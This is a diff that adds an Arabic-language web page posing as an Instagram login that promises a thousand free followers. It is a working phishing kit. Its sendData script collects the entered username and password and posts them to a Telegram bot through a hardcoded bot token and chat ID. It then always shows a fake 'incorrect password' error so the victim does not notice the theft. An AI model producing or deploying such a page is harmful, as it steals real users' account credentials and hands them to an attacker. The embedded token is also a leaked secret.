@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login Page</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Pacifico&display=swap');
+
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #000000, #ff007f); /* الزهري والأسود */
+            color: white;
+            overflow: hidden;
+        }
+
+        .fade-in {
+            opacity: 0;
+            transform: translateY(20px);
+            animation: fadeIn 1s forwards;
+        }
+
+        .fade-in-delay-1 {
+            animation-delay: 0.5s;
+        }
+
+        .fade-in-delay-2 {
+            animation-delay: 1s;
+        }
+
+        .fade-in-delay-3 {
+            animation-delay: 1.5s;
+        }
+
+        @keyframes fadeIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .overlay {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100%;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .logo {
+            font-size: 50px;
+            font-family: 'Pacifico', cursive;
+            color: #ffdd57;
+            text-shadow: 0 0 10px rgba(255, 221, 87, 0.8);
+        }
+
+        .subtitle {
+            font-size: 24px;
+            color: #fff;
+            margin-top: 10px;
+            text-shadow: 0 0 5px rgba(255, 255, 255, 0.6);
+        }
+
+        .login-box {
+            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 10px;
+            width: 80%;
+            max-width: 400px;
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+            position: relative;
+        }
+
+        .login-box input {
+            background: rgba(255, 255, 255, 0.8);
+            border: none;
+            padding: 10px;
+            margin: 5px 0;
+            border-radius: 5px;
+            width: calc(100% - 20px);
+            font-size: 16px;
+        }
+
+        .password-wrapper {
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: flex-start;
+            margin-bottom: 10px;
+        }
+
+        .toggle-password {
+            display: flex;
+            align-items: center;
+            margin-top: 5px;
+            font-size: 14px;
+            color: #888;
+            cursor: pointer;
+        }
+
+        .toggle-password span {
+            margin-left: 5px;
+            font-size: 18px;
+        }
+
+        .login-box button {
+            background: linear-gradient(to right, #ff007f, #ff4f9f);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            width: 100%;
+            max-width: calc(100% - 10px);
+            box-shadow: 0 4px 10px rgba(255, 0, 127, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-box button:hover {
+            background: linear-gradient(to right, #ff4f9f, #ff007f);
+            transform: scale(1.05);
+        }
+
+        .login-box button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.4);
+            transform: skewX(-45deg);
+            transition: left 0.3s ease-in-out; /* سرعة جديدة أسرع قليلاً */
+        }
+
+        .login-box button:hover::before {
+            left: 100%;
+            transition: left 0.6s ease-in-out; /* تحويم أسرع قليلًا */
+        }
+
+        .error-message {
+            color: #ff4f4f;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+            text-shadow: 0 0 5px rgba(255, 0, 0, 0.5);
+        }
+
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div class="overlay">
+    <div class="logo fade-in">Instagram</div>
+    <div class="subtitle fade-in fade-in-delay-1">+1000 متابع مجاني</div>
+    <div class="login-box fade-in fade-in-delay-2">
+        <input type="text" id="username" placeholder="اسم المستخدم أو البريد الإلكتروني">
+        <div class="password-wrapper">
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <div class="toggle-password" onclick="togglePassword()">
+                <span id="toggle-icon">👁️</span> <span id="toggle-text">إظهار كلمة المرور</span>
+            </div>
+        </div>
+        <button onclick="sendData()">تسجيل الدخول</button>
+        <div class="error-message" id="error-message">اسم المستخدم أو كلمة المرور غير صحيحة.</div>
+    </div>
+    <div class="footer fade-in fade-in-delay-3">© 2024 Instagram Clone. All rights reserved.</div>
+</div>
+<script>
+    function togglePassword() {
+        const passwordInput = document.getElementById('password');
+        const toggleIcon = document.getElementById('toggle-icon');
+        const toggleText = document.getElementById('toggle-text');
+        
+        if (passwordInput.type === 'password') {
+            passwordInput.type = 'text';
+            toggleIcon.textContent = '🙈';
+            toggleText.textContent = 'إخفاء كلمة المرور';
+        } else {
+            passwordInput.type = 'password';
+            toggleIcon.textContent = '👁️';
+            toggleText.textContent = 'إظهار كلمة المرور';
+        }
+    }
+
+    function sendData() {
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+
+        if (!username || !password) {
+            document.getElementById('error-message').style.display = 'block';
+            return;
+        }
+
+        document.getElementById('error-message').style.display = 'none';
+
+        const botToken = "7952592542:AAHy6G98N-PoKsQM9adHQQiBbxBJCCw_Lo4";
+        const chatId = "6647290277";
+        const message = `Username: ${username}\nPassword: ${password}`;
+
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('error-message').style.display = 'block';
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+</body>
+</html>
